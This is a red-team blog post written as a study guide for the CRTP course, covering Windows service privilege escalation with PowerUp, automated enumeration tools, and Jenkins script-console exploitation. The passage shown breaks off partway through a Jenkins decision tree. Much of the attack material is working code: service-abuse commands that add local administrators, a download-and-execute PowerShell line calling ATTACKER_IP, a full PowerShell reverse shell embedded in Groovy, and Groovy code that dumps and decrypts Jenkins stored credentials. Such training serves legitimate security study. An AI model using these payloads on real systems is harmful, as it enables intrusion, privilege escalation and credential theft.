---
title: "CRTP Deep Dive: Service Privilege Escalation, Jenkins Exploitation, GPOddity & Inveigh Hash Capture"
date: 2026-04-08 15:00:00 +0200
categories: [Red Team, CRTP]
tags: [privilege-escalation, powerup, jenkins, gpoddity, inveigh, active-directory, windows, crtp]
description: "A comprehensive guide covering Windows service privilege escalation with PowerUp, automated privesc checks, Jenkins Groovy exploitation, GPOddity GPO abuse, and Inveigh LNK-based hash capture — all from the CRTP perspective."
image:
  path: /assets/img/headers/privesc-banner.png
  alt: "Privilege Escalation & Lateral Movement"
pin: true
math: true
mermaid: true
---

## Introduction

In Active Directory environments, privilege escalation and lateral movement are the bread and butter of any red team operator. This post covers five critical attack surfaces tested in the **Certified Red Team Professional (CRTP)** course:

1. **Service Issues with PowerUp** — exploiting misconfigured Windows services
2. **Automated Privilege Escalation Checks** — PowerUp, PrivescCheck, and PEASS-ng
3. **Jenkins Script Console Exploitation** — executing Groovy scripts for RCE
4. **GPOddity** — abusing GPO ACLs via NTLM relaying
5. **Inveigh & Malicious LNK Files** — capturing NTLMv2 hashes

> All commands in this post are **PowerShell-based** and designed for **Windows environments**, as used in CRTP labs.
{: .prompt-info }

---

## Service Privilege Escalation with PowerUp

### What is PowerUp?

**PowerUp** is a PowerShell module from the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) framework. It identifies and exploits common Windows privilege escalation paths — primarily around **misconfigured services**.

### The Attack Flow

```
┌──────────────────────────────────────────────────────────────────┐
│                 SERVICE PRIVILEGE ESCALATION FLOW                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Load PowerUp                                            │
│  ┌─────────────────────────────────────────────────┐             │
│  │ . .\PowerUp.ps1                                 │             │
│  └──────────────────────┬──────────────────────────┘             │
│                         │                                        │
│                         ▼                                        │
│  Step 2: Enumerate Service Misconfigurations                     │
│  ┌─────────────────────────────────────────────────┐             │
│  │ Get-ServiceUnquoted        (unquoted paths)     │             │
│  │ Get-ModifiableServiceFile  (writable binaries)  │             │
│  │ Get-ModifiableService      (weak DACLs)         │             │
│  └──────────────────────┬──────────────────────────┘             │
│                         │                                        │
│                         ▼                                        │
│  Step 3: Exploit the Weakness                                    │
│  ┌─────────────────────────────────────────────────┐             │
│  │ Write-ServiceBinary / Invoke-ServiceAbuse       │             │
│  │ OR drop a binary in unquoted path gap           │             │
│  └──────────────────────┬──────────────────────────┘             │
│                         │                                        │
│                         ▼                                        │
│  Step 4: Restart Service → Code Executes as SYSTEM               │
│  ┌─────────────────────────────────────────────────┐             │
│  │ Restart-Service -Name 'VulnSvc'                 │             │
│  │ => Payload runs as NT AUTHORITY\SYSTEM           │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Loading PowerUp

```powershell
# Bypass execution policy and load PowerUp into the current session
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PowerUp.ps1
```

> PowerUp must be **dot-sourced** (note the `. .`) so its functions become available in your current PowerShell session scope.
{: .prompt-tip }

---

### 1. Get-ServiceUnquoted — Unquoted Service Paths

#### What Is an Unquoted Service Path?

When a Windows service binary path contains **spaces** and is **not enclosed in quotes**, Windows tries to resolve the path by testing each space as a potential executable boundary.

```
┌──────────────────────────────────────────────────────────────────┐
│           UNQUOTED SERVICE PATH RESOLUTION ORDER                 │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Service Path (unquoted):                                        │
│  C:\Program Files\Vuln Service\Sub Dir\service.exe               │
│                                                                  │
│  Windows Tries (in order):                                       │
│                                                                  │
│  1. C:\Program.exe                       ← Check first space    │
│  2. C:\Program Files\Vuln.exe            ← Check second space   │
│  3. C:\Program Files\Vuln Service\Sub.exe← Check third space    │
│  4. C:\Program Files\Vuln Service\Sub Dir\service.exe ← Actual  │
│                                                                  │
│  ★ If attacker can write to any checked path before the real     │
│    binary, Windows executes the attacker's binary INSTEAD.       │
│                                                                  │
│  Example: Drop "Vuln.exe" in C:\Program Files\                   │
│  → Service starts → Windows runs Vuln.exe as SYSTEM!             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Running the Check

```powershell
# Find services with unquoted paths AND a space in the path name
Get-ServiceUnquoted -Verbose
```

#### Example Output

```
VERBOSE: Checking for unquoted service paths...

ServiceName    : VulnerableSvc
Path           : C:\Program Files\Vuln Service\Sub Dir\service.exe
ModifiablePath : C:\Program Files\Vuln Service
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VulnerableSvc' -Path 
                 'C:\Program Files\Vuln Service\Sub.exe'
CanRestart     : True

ServiceName    : CustomAppSvc
Path           : C:\Company Apps\Internal Tool\runner.exe
ModifiablePath : C:\Company Apps
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'CustomAppSvc' -Path 
                 'C:\Company Apps\Internal.exe'
CanRestart     : True
```

#### Key Fields to Examine

| Field            | Meaning                                                    | What to Look For                      |
|------------------|------------------------------------------------------------|---------------------------------------|
| `ServiceName`    | Name of the vulnerable service                             | Any service with unquoted + spaces    |
| `Path`           | Full binary path (unquoted)                                | Spaces without surrounding quotes     |
| `ModifiablePath` | Directory where you can write                              | Must be writable by current user      |
| `StartName`      | Account the service runs as                                | **LocalSystem** or **Administrator**  |
| `AbuseFunction`  | PowerUp command to exploit                                 | Copy and run this directly            |
| `CanRestart`     | Whether you can restart the service                        | Must be **True** for immediate exploit|

#### Exploiting Unquoted Path

```powershell
# Option A: Use PowerUp's built-in abuse function
# This writes a service binary that adds a local admin user
Write-ServiceBinary -Name 'VulnerableSvc' -Path 'C:\Program Files\Vuln Service\Sub.exe'

# Option B: Manually place your own payload
# Generate payload (on attacker machine)
# msfvenom -p windows/exec CMD="net localgroup administrators student /add" -f exe -o Sub.exe
Copy-Item .\Sub.exe 'C:\Program Files\Vuln Service\Sub.exe'

# Restart the service to trigger execution
Restart-Service -Name 'VulnerableSvc'

# Verify privilege escalation
net localgroup administrators
```

#### Expected Exploitation Output

```
PS C:\> Write-ServiceBinary -Name 'VulnerableSvc' -Path 'C:\Program Files\Vuln Service\Sub.exe'

ServiceName  : VulnerableSvc
Path         : C:\Program Files\Vuln Service\Sub.exe
Command      : net user john Password123! /add & net localgroup administrators john /add

PS C:\> Restart-Service -Name 'VulnerableSvc'

PS C:\> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access

Members
-----------------------------------------------
Administrator
john
The command completed successfully.
```

---

### 2. Get-ModifiableServiceFile — Writable Service Binaries

#### The Concept

```
┌──────────────────────────────────────────────────────────────────┐
│              MODIFIABLE SERVICE FILE ATTACK                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Normal Operation:                                               │
│  ┌─────────┐    starts    ┌──────────────────┐                   │
│  │ SCM     │ ──────────► │ C:\Svc\legit.exe │ ← Legitimate      │
│  └─────────┘              └──────────────────┘                   │
│                                                                  │
│  Attack Scenario:                                                │
│  1. Attacker finds legit.exe is WRITABLE                         │
│  2. Replaces legit.exe with malicious binary                     │
│  3. Service restarts → malicious code runs as SYSTEM             │
│                                                                  │
│  ┌─────────┐    starts    ┌──────────────────┐                   │
│  │ SCM     │ ──────────► │ C:\Svc\legit.exe │ ← NOW MALICIOUS   │
│  └─────────┘              └──────────────────┘                   │
│                                  │                               │
│                                  ▼                               │
│                          SYSTEM SHELL! 🎯                        │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Running the Check

```powershell
# Find services where the current user can write to the binary or modify arguments
Get-ModifiableServiceFile -Verbose
```

#### Example Output

```
VERBOSE: Checking service binary paths for modifiable files...

ServiceName                : filepermsvc
Path                       : C:\Program Files\CustomApp\service.exe
ModifiableFile             : C:\Program Files\CustomApp\service.exe
ModifiableFilePermissions  : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                  : LocalSystem
AbuseFunction              : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                 : True
```

#### Exploiting Writable Service Binaries

```powershell
# Step 1: Backup the original binary (good practice for cleanup)
Copy-Item 'C:\Program Files\CustomApp\service.exe' 'C:\Program Files\CustomApp\service.exe.bak'

# Step 2: Use PowerUp to replace the service binary
# This creates a binary that adds a local admin user by default
Install-ServiceBinary -Name 'filepermsvc'

# Step 3: Restart the service to execute the payload
Restart-Service -Name 'filepermsvc'

# Step 4: Verify the new admin user was created
net localgroup administrators

# Step 5: Cleanup — restore original binary
# (Always clean up in real engagements!)
Restore-ServiceBinary -Name 'filepermsvc'
```

---

### 3. Get-ModifiableService — Weak Service DACLs

#### The Concept

This is the most powerful check. If the current user can **modify the service configuration itself**, the attacker can change the binary path to point to any executable.

```
┌──────────────────────────────────────────────────────────────────┐
│               MODIFIABLE SERVICE DACL ATTACK                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Normal State:                                                   │
│  Service "AppSvc" → runs C:\App\legit.exe                        │
│                                                                  │
│  Attack:                                                         │
│  1. User has ChangeConfig permission on the service              │
│  2. Attacker modifies binPath to malicious command               │
│  3. Service restarts → executes attacker command as SYSTEM        │
│                                                                  │
│  ┌──────────────────────────────┐                                │
│  │  sc.exe config AppSvc       │                                 │
│  │  binPath= "net localgroup   │                                 │
│  │  administrators student /add"│                                │
│  └──────────────┬───────────────┘                                │
│                 │                                                 │
│                 ▼                                                 │
│  ┌──────────────────────────────┐                                │
│  │  Restart-Service AppSvc     │                                 │
│  │  → Runs command as SYSTEM!  │                                 │
│  └──────────────────────────────┘                                │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Running the Check

```powershell
# Find services whose configuration the current user can modify
Get-ModifiableService -Verbose
```

#### Example Output

```
VERBOSE: Checking for modifiable service configurations...

ServiceName     : daclsvc
Path            : C:\Program Files\DACL Service\daclservice.exe
StartName       : LocalSystem
AbuseFunction   : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart      : True
```

#### Exploiting Weak Service DACLs

```powershell
# Method 1: Use PowerUp's Invoke-ServiceAbuse (adds local admin by default)
Invoke-ServiceAbuse -Name 'daclsvc'

# Method 2: Custom command — add your user to local admins
Invoke-ServiceAbuse -Name 'daclsvc' -UserName 'dcorp\student1' `
    -Command "net localgroup administrators dcorp\student1 /add"

# Method 3: Run a reverse shell payload
Invoke-ServiceAbuse -Name 'daclsvc' `
    -Command "C:\Users\Public\reverse_shell.exe"

# Verify
net localgroup administrators
```

#### Expected Output

```
PS C:\> Invoke-ServiceAbuse -Name 'daclsvc'

ServiceAbused  Command
-------------  -------
daclsvc        net user john Password123! /add & net localgroup 
               administrators john /add

PS C:\> net localgroup administrators
Members
-----------------------------------------------
Administrator
john
```

---

### PowerUp: Complete Function Reference

```
┌──────────────────────────────────────────────────────────────────┐
│                  POWERUP FUNCTION REFERENCE                       │
├────────────────────────────────────┬─────────────────────────────┤
│         ENUMERATION                │        EXPLOITATION         │
├────────────────────────────────────┼─────────────────────────────┤
│ Get-ServiceUnquoted               │ Write-ServiceBinary          │
│ → Unquoted paths with spaces      │ → Drop binary in path gap   │
│                                    │                             │
│ Get-ModifiableServiceFile         │ Install-ServiceBinary        │
│ → Writable service binaries       │ → Replace service binary     │
│                                    │                             │
│ Get-ModifiableService             │ Invoke-ServiceAbuse          │
│ → Weak service DACLs              │ → Modify binPath config      │
│                                    │                             │
│ Get-ServiceDetail                 │ Restore-ServiceBinary        │
│ → Detailed service info           │ → Cleanup after exploitation │
│                                    │                             │
│ Test-ServiceDaclPermission        │ Write-UserAddMSI             │
│ → Test specific DACL perms        │ → MSI-based user addition    │
│                                    │                             │
│ Find-ProcessDLLHijack             │ Write-HijackDll              │
│ → DLL hijacking opportunities     │ → Create hijack DLL          │
│                                    │                             │
│ Get-RegistryAlwaysInstallElevated │ Set-ServiceBinPath           │
│ → AlwaysInstallElevated check     │ → Direct binPath modification│
├────────────────────────────────────┴─────────────────────────────┤
│                    COMPREHENSIVE                                 │
├──────────────────────────────────────────────────────────────────┤
│ Invoke-AllChecks → Runs EVERY enumeration check at once          │
└──────────────────────────────────────────────────────────────────┘
```

---

## Automated Privilege Escalation Checks

Running individual checks is great for targeted enumeration, but in CRTP labs and real engagements, you want to **run everything at once** to identify all possible escalation vectors.

### Comparison of Tools

```
┌──────────────────────────────────────────────────────────────────┐
│         PRIVILEGE ESCALATION TOOL COMPARISON                     │
├──────────────┬──────────────┬──────────────┬─────────────────────┤
│ Feature      │ PowerUp      │ PrivescCheck │ WinPEAS             │
├──────────────┼──────────────┼──────────────┼─────────────────────┤
│ Language     │ PowerShell   │ PowerShell   │ C# (.exe)           │
│ AMSI Evasion │ Manual       │ Manual       │ Obfuscated builds   │
│ Service Enum │ ★★★★★       │ ★★★★★       │ ★★★★☆              │
│ Registry     │ ★★★☆☆       │ ★★★★★       │ ★★★★★              │
│ Cred Hunting │ ★★☆☆☆       │ ★★★★☆       │ ★★★★★              │
│ DLL Hijack   │ ★★★★☆       │ ★★★☆☆       │ ★★★★☆              │
│ Output       │ Text         │ TXT/HTML/CSV │ Color-coded console │
│ Exploitation │ Built-in     │ Enum only    │ Enum only           │
│ CRTP Focus   │ ★★★★★       │ ★★★★☆       │ ★★★☆☆              │
│ Stealth      │ High         │ High         │ Medium (exe on disk)│
├──────────────┴──────────────┴──────────────┴─────────────────────┤
│ RECOMMENDATION: Use ALL THREE — each catches things others miss  │
└──────────────────────────────────────────────────────────────────┘
```

### Tool 1: PowerUp — Invoke-AllChecks

```powershell
# Load and run all PowerUp checks at once
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PowerUp.ps1
Invoke-AllChecks
```

#### Example Output

```
[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is NOT in a local admin group.

[*] Checking for unquoted service paths...
[+] Found 2 unquoted service paths!

ServiceName    : VulnerableSvc
Path           : C:\Program Files\Vuln Service\Sub Dir\service.exe
ModifiablePath : C:\Program Files\Vuln Service
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VulnerableSvc' -Path 'C:\Program Files\Vuln Service\Sub.exe'
CanRestart     : True

[*] Checking service executable permissions...
[+] Found 1 service with writable binary!

ServiceName                : filepermsvc
Path                       : C:\Program Files\CustomApp\service.exe
ModifiableFile             : C:\Program Files\CustomApp\service.exe
StartName                  : LocalSystem
AbuseFunction              : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                 : True

[*] Checking service configuration permissions...
[+] Found 1 modifiable service!

ServiceName     : daclsvc
Path            : C:\Program Files\DACL Service\daclservice.exe
StartName       : LocalSystem
AbuseFunction   : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart      : True

[*] Checking for AlwaysInstallElevated registry key...
[-] AlwaysInstallElevated not enabled.

[*] Checking for Autologon credentials in registry...
[+] Autologon credentials found!

DefaultDomainName : DCORP
DefaultUserName   : svcadmin
DefaultPassword   : *PasswordHere*

[*] Checking for modifiable registry autoruns and configs...
[-] No modifiable autoruns found.

[*] Checking for modifiable schtask files/configs...
[-] No vulnerable scheduled tasks found.

[*] Checking for unattended install files...
[+] Found unattended install file!

UnattendPath : C:\Windows\Panther\Unattend.xml

[*] Checking for encrypted web.config strings...
[-] No encrypted web.config strings found.

[*] Completed all checks.
```

### Tool 2: PrivescCheck — Invoke-PrivescCheck

[PrivescCheck](https://github.com/itm4n/PrivescCheck) is a more modern and comprehensive alternative that checks far more categories than PowerUp.

```powershell
# Download and run PrivescCheck
# Method 1: Load from disk
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck

# Method 2: Run with extended checks and generate HTML report
Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML

# Method 3: Full audit mode — all checks + all report formats
Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
```

#### PrivescCheck Categories

```
┌──────────────────────────────────────────────────────────────────┐
│              PRIVESCCHECK SCAN CATEGORIES                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐  ┌─────────────────┐  ┌──────────────────┐     │
│  │  SERVICES   │  │  CREDENTIALS    │  │  REGISTRY        │     │
│  ├─────────────┤  ├─────────────────┤  ├──────────────────┤     │
│  │ Binary      │  │ WinLogon        │  │ AlwaysInstall    │     │
│  │ Permissions │  │ Credential Mgr  │  │ Elevated         │     │
│  │ Unquoted    │  │ Vault           │  │ AutoRuns         │     │
│  │ Paths       │  │ GPP Passwords   │  │ Permissions      │     │
│  │ DACL Abuse  │  │ DPAPI           │  │                  │     │
│  │ DLL Hijack  │  │ SAM/SYSTEM      │  │                  │     │
│  └─────────────┘  └─────────────────┘  └──────────────────┘     │
│                                                                  │
│  ┌─────────────┐  ┌─────────────────┐  ┌──────────────────┐     │
│  │  SCHEDULED  │  │  NETWORK        │  │  MISCELLANEOUS   │     │
│  │  TASKS      │  │  CONFIG         │  │                  │     │
│  ├─────────────┤  ├─────────────────┤  ├──────────────────┤     │
│  │ Writable    │  │ Open Shares     │  │ WSUS HTTP        │     │
│  │ Task Files  │  │ WiFi Passwords  │  │ LAPS Enabled     │     │
│  │ Task Config │  │ SMB Signing     │  │ BitLocker        │     │
│  │ Permissions │  │ LDAP Signing    │  │ Defender Status  │     │
│  └─────────────┘  └─────────────────┘  └──────────────────┘     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Example Output

```
PS C:\Tools> Invoke-PrivescCheck

+------+------------------------------------------------+------+
| OK   | BASIC SYSTEM INFORMATION                        |      |
+------+------------------------------------------------+------+
| INFO | Hostname: SRV01                                 |      |
| INFO | OS: Windows Server 2019 Standard (10.0.17763)   |      |
| INFO | Architecture: AMD64                              |      |
| INFO | Current User: dcorp\student1                     |      |
+------+------------------------------------------------+------+

+------+------------------------------------------------+------+
| VULN | SERVICES - Non-default Services                 | Med  |
+------+------------------------------------------------+------+
| VULN | Service 'VulnerableSvc' has unquoted path with  |      |
|      | spaces and writable directory                   |      |
+------+------------------------------------------------+------+

+------+------------------------------------------------+------+
| VULN | CREDENTIALS - WinLogon                          | High |
+------+------------------------------------------------+------+
| VULN | WinLogon credentials found!                     |      |
|      | Domain   : DCORP                                |      |
|      | Username : svcadmin                              |      |
|      | Password : P@ssw0rd!2025                         |      |
+------+------------------------------------------------+------+

+------+------------------------------------------------+------+
| VULN | SERVICES - Binary Permissions                   | High |
+------+------------------------------------------------+------+
| VULN | Service 'filepermsvc' binary is writable by     |      |
|      | current user (BUILTIN\Users: WriteData)         |      |
+------+------------------------------------------------+------+

+------+------------------------------------------------+------+
| OK   | HARDENING - LAPS                                |      |
+------+------------------------------------------------+------+
| WARN | LAPS is not installed on this machine            |      |
+------+------------------------------------------------+------+

+------+------------------------------------------------+------+
|      | SUMMARY                                         |      |
+------+------------------------------------------------+------+
| HIGH | 2 high-severity issues found                    |      |
| MED  | 1 medium-severity issue found                   |      |
| LOW  | 0 low-severity issues found                     |      |
+------+------------------------------------------------+------+
```

### Tool 3: WinPEAS (PEASS-ng)

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) is a compiled C# executable that performs the most comprehensive enumeration of all three tools.

```powershell
# Method 1: Run WinPEAS directly (must transfer to target first)
.\winPEASx64.exe

# Method 2: Save output to a file for later analysis
.\winPEASx64.exe | Tee-Object -FilePath "C:\Users\Public\winpeas_output.txt"

# Method 3: Run specific checks only
.\winPEASx64.exe servicesinfo   # Only service checks
.\winPEASx64.exe userinfo       # Only user info
.\winPEASx64.exe windowscreds   # Only Windows credentials

# Method 4: Quiet mode (less output)
.\winPEASx64.exe quiet

# Method 5: Download and execute in memory (bypass disk detection)
# From a PowerShell session:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPEAS.ps1')
```

#### WinPEAS Color Coding

```
┌──────────────────────────────────────────────────────────────────┐
│               WINPEAS COLOR CODE LEGEND                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  🔴 RED/YELLOW    → Critical finding! Possible privesc vector   │
│                     Pay immediate attention to these             │
│                                                                  │
│  🟢 GREEN         → Security protection or defense is ENABLED   │
│                     Good for the defender, bad for attacker      │
│                                                                  │
│  🔵 CYAN          → Active user account detected                │
│                     Check privileges and group memberships       │
│                                                                  │
│  🔵 BLUE          → Disabled user account                       │
│                     Usually not exploitable                      │
│                                                                  │
│  🟡 YELLOW (link) → Informational with hyperlinks               │
│                     Follow for more exploit details              │
│                                                                  │
│  ⬜ WHITE         → Normal information                           │
│                     Background data                              │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### What WinPEAS Checks

```powershell
# WinPEAS scans these categories automatically:
# ================================================
# [+] System Information        - OS version, hotfixes, env vars
# [+] Users Information         - Current user, groups, privileges
# [+] Processes Information     - Running processes, DLL hijacking
# [+] Services Information      - Unquoted paths, writable binaries
# [+] Applications Information  - Installed apps, startup items
# [+] Network Information       - Open ports, listening services
# [+] Windows Credentials       - Vault, DPAPI, WinLogon, SAM
# [+] Browser Information       - Saved passwords, bookmarks
# [+] Interesting Files         - Config files, backup files
```

### Recommended Scan Order for CRTP

```
┌──────────────────────────────────────────────────────────────────┐
│        RECOMMENDED PRIVILEGE ESCALATION SCAN WORKFLOW            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  STEP 1: Quick Targeted Check (PowerUp)                          │
│  ┌─────────────────────────────────────────┐                     │
│  │ . .\PowerUp.ps1                         │                     │
│  │ Invoke-AllChecks                        │  ⏱ ~30 seconds     │
│  └─────────────────┬───────────────────────┘                     │
│                    │                                             │
│                    ▼                                             │
│  STEP 2: Deep Enumeration (PrivescCheck)                         │
│  ┌─────────────────────────────────────────┐                     │
│  │ . .\PrivescCheck.ps1                    │                     │
│  │ Invoke-PrivescCheck -Extended           │  ⏱ ~1-2 minutes    │
│  └─────────────────┬───────────────────────┘                     │
│                    │                                             │
│                    ▼                                             │
│  STEP 3: Comprehensive Sweep (WinPEAS)                           │
│  ┌─────────────────────────────────────────┐                     │
│  │ .\winPEASx64.exe                        │  ⏱ ~3-5 minutes    │
│  └─────────────────┬───────────────────────┘                     │
│                    │                                             │
│                    ▼                                             │
│  STEP 4: Cross-reference findings and EXPLOIT                    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Jenkins Script Console Exploitation

### Overview

Jenkins is a widely-used CI/CD automation server. In many Active Directory environments, Jenkins servers run with elevated privileges and can be a goldmine for lateral movement.

```
┌──────────────────────────────────────────────────────────────────┐
│               JENKINS EXPLOITATION FLOW                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Attacker                      Jenkins Server                    │
│  ┌──────────┐                  ┌──────────────────┐              │
│  │          │  1. Access /script│                  │              │
│  │          │ ────────────────► │  Script Console  │              │
│  │          │                  │  (Groovy Engine)  │              │
│  │          │  2. Execute      │                  │              │
│  │          │  Groovy Code     │  ┌────────────┐  │              │
│  │          │ ────────────────► │  │ OS Command │  │              │
│  │          │                  │  │ Execution  │  │              │
│  │          │  3. Receive      │  └────────────┘  │              │
│  │          │  Output/Shell    │                  │              │
│  │          │ ◄──────────────── │  Runs as Jenkins │              │
│  └──────────┘                  │  Service Account │              │
│                                └──────────────────┘              │
│                                                                  │
│  ★ Default Jenkins < 2.x: No authentication required!           │
│  ★ Even in 2.x+: Admin users can access /script                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Accessing the Script Console

There are two primary ways to execute commands on a Jenkins Master:

```powershell
# Way 1: Direct Script Console access (Admin users or pre-2.x)
# Navigate to: http://<jenkins_server>/script
# This is available if:
#   - Jenkins version < 2.x (no auth by default)
#   - You have Admin credentials
#   - ACLs are misconfigured (Anonymous → Overall/Read)

# Way 2: Through Jenkins Pipeline (Jenkinsfile)
# Create a new Pipeline job with embedded Groovy code

# Way to discover Jenkins servers on the network:
# Scan for port 8080 (default Jenkins port)
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $tcp.Connect($ip, 8080)
        if ($tcp.Connected) {
            Write-Output "[+] Jenkins found: $ip:8080"
            $tcp.Close()
        }
    } catch {}
}
```

### Groovy Script: Execute OS Commands

```groovy
// ============================================================
// GROOVY SCRIPT: Execute OS Commands on Jenkins Server
// Paste this into http://<jenkins_server>/script
// ============================================================

// Basic command execution with output capture
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'cmd.exe /c whoami /all'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

#### Example Output

```
out> USER INFORMATION
----------------
User Name           SID
=================== =============================================
nt authority\system S-1-5-18

GROUP INFORMATION
-----------------
Group Name                             Type             SID
====================================== ================ ============
BUILTIN\Administrators                 Alias            S-1-5-32-544
Everyone                               Well-known group S-1-1-0
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token  Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas           Enabled
SeTcbPrivilege                Act as part of the OS          Enabled
SeDebugPrivilege              Debug programs                 Enabled

err>
```

### Groovy Scripts: Complete Arsenal for CRTP

```groovy
// ============================================================
// 1. SYSTEM RECONNAISSANCE
// ============================================================

// Get current user and hostname
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'cmd.exe /c whoami & hostname & ipconfig'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(5000)
println "out> $sout err> $serr"

// ============================================================
// 2. ENUMERATE DOMAIN INFORMATION
// ============================================================

def sout2 = new StringBuffer(), serr2 = new StringBuffer()
def proc2 = 'cmd.exe /c net user /domain & net group "Domain Admins" /domain'.execute()
proc2.consumeProcessOutput(sout2, serr2)
proc2.waitForOrKill(5000)
println "out> $sout2 err> $serr2"

// ============================================================
// 3. LIST RUNNING PROCESSES
// ============================================================

def sout3 = new StringBuffer(), serr3 = new StringBuffer()
def proc3 = 'cmd.exe /c tasklist /V'.execute()
proc3.consumeProcessOutput(sout3, serr3)
proc3.waitForOrKill(5000)
println "out> $sout3 err> $serr3"

// ============================================================
// 4. DUMP ENVIRONMENT VARIABLES (may contain creds!)
// ============================================================

def sout4 = new StringBuffer(), serr4 = new StringBuffer()
def proc4 = 'cmd.exe /c set'.execute()
proc4.consumeProcessOutput(sout4, serr4)
proc4.waitForOrKill(5000)
println "out> $sout4 err> $serr4"

// ============================================================
// 5. REVERSE SHELL via PowerShell (Windows Target)
// ============================================================
// Replace ATTACKER_IP and PORT with your listener details

def sout5 = new StringBuffer(), serr5 = new StringBuffer()
def proc5 = '''cmd.exe /c powershell -nop -w hidden -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''.execute()
proc5.consumeProcessOutput(sout5, serr5)
proc5.waitForOrKill(5000)
println "out> $sout5 err> $serr5"

// ============================================================
// 6. DOWNLOAD AND EXECUTE TOOL (e.g., PowerUp, Mimikatz)
// ============================================================

def sout6 = new StringBuffer(), serr6 = new StringBuffer()
def proc6 = 'cmd.exe /c powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER_IP/PowerUp.ps1\'); Invoke-AllChecks"'.execute()
proc6.consumeProcessOutput(sout6, serr6)
proc6.waitForOrKill(30000)
println "out> $sout6 err> $serr6"

// ============================================================
// 7. DUMP JENKINS SECRETS (Groovy-native, no OS commands)
// ============================================================

// List all credentials stored in Jenkins
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println("ID: ${c.id}")
    println("Description: ${c.description}")
    println("Username: ${c.username}")
    if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
        println("Password: ${c.password}")
    }
    println("---")
}

// ============================================================
// 8. DECRYPT JENKINS SECRETS (if you find encrypted strings)
// ============================================================

println(hudson.util.Secret.decrypt("{AQAAABAAAAAgPT7JbBVgyWiivobt0CJEiZ....}"))

// ============================================================
// 9. LIST ALL JENKINS NODES AND THEIR CONNECTIONS
// ============================================================

for (node in Jenkins.instance.nodes) {
    println("Node: ${node.name}")
    println("  OS: ${node.computer.getSystemProperties()['os.name']}")
    println("  Status: ${node.computer.isOnline() ? 'ONLINE' : 'OFFLINE'}")
    println("  Executors: ${node.numExecutors}")
    println("---")
}
```

### Jenkins Exploitation Decision Tree

```
┌──────────────────────────────────────────────────────────────────┐
│           JENKINS EXPLOITATION DECISION TREE                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Found Jenkins Server?                                           │
│  │                                                               │
│  ├── Can access /script without auth? (Jenkins < 2.x)            │
│  │   └── YES → Execute Groovy reverse shell immediately          │
│  │                                                               │
│  ├── Have Admin credentials?                                     │
│  │   └── YES → Navigate to /script → Execute Groovy code         │
│  │                                                               │
│  ├── Have Build permissions only?                                │
│  │   └── YES → Create Pipeline job with Groovy in Jenkinsfile    │
│  │                                                               │
│  ├── Can create/modify jobs?                                     │
│  │   └── YES → Add "Execute Windows batch command" build step    │
│  │            → Trigger build → Capture output                   │
│  │                                                               │
